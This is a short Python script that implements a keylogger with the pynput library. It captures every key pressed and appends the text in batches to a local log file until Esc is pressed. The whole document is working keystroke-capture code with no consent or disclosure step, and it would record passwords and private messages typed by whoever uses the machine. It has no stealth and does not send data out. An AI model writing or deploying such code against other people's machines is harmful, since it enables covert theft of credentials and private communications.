from pynput.keyboard import Key, Listener

# Define the file where the log will be saved
log_file = "key_log.txt"

# Initialize a list to store the keystrokes
keys = []


def on_press(key):
    # Append the key to the keys list
    keys.append(key)

    # Save keys to file every 10 keystrokes
    if len(keys) >= 10:
        write_file(keys)
        keys.clear()


def write_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            # Format the key and write to file
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    # Stop listener when 'esc' key is pressed
    if key == Key.esc:
        return False


# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
